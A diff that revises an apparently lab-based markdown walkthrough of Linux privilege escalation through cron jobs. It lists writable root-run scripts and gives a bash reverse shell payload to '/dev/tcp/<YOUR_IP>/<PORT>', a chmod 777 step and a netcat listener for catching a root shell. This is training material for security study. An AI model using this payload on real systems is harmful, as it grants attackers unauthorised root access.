@@ -1,32 +1,69 @@
-# 🔐 Privilege Escalation: Cron Job
+# 🔐 Privilege Escalation: Cron Jobs
 
-Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
-The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+Cron jobs are used to execute scripts or binaries automatically at scheduled times.
+
+By default, cron jobs run with the privileges of their owners rather than the current user. While properly configured cron jobs are not inherently vulnerable, misconfigurations can lead to privilege escalation.
+
+The idea is simple:
+
+> If a scheduled task runs as `root` and we can modify the executed script, our malicious code will also run with root privileges.
+
 ---
-To know the job we can exploit it use command :
+## 🔍 Checking Cron Jobs
+
+To view scheduled cron jobs, use:
+
 ```bash
 cat /etc/crontab
 ```
 
 ![img](screenshots/crontab/crontab_command.png)
 
-we find many job can exploit it 
-* **/home/karen/backup.sh*
-* **/tmp/test.py**
+---
 
-we will work in "/tmp/test.py"
+## 📌 Discovered Vulnerable Jobs
 
-go to tmp by " cd /tmp "
-then search file with name test.py if not find, create one with same name
-now write exploit code :
+During enumeration, we identified two potentially vulnerable scripts:
+
+- `/home/karen/backup.sh`
+- `/tmp/test.py`
+
+In this case, we targeted:
+
+```bash
+/tmp/test.py
+```
+
+---
+
+## 🚀 Exploiting the Cron Job
+
+Navigate to the `/tmp` directory:
+
+```bash
+cd /tmp
+```
+
+Search for the file `test.py`.
+
+If the file does not exist, create it with the same name.
+
+---
+
+## ✍️ Writing the Reverse Shell Payload
+
+We added the following reverse shell payload:
+
 ```bash
 #!/bin/bash
-bash -i >& /dev/tcp/<ip_for_your_devie>/port 0>&1
+bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
 ```
 
 ![img](screenshots/crontab/nano_file.png)
 
-change mode for this file
+## 🔧 Changing File Permissions
+
+Make the script executable:
 
 ```bash
 chmod 777 test.py
@@ -34,9 +71,17 @@ chmod 777 test.py
 
 ![img](screenshots/crontab/chmod.png)
 
-then from your machine use net cat to connect the victim machine
+---
+
+## 🎧 Starting a Netcat Listener
+
+On the attacker's machine, start a Netcat listener:
+
 ```bash
-nc -nlvp port
+nc -nlvp <PORT>
 ```
 
+Once the cron job executes, a reverse shell connection is received with root privileges.
+
 ![img](screenshots/crontab/get_root_cron.png)
+
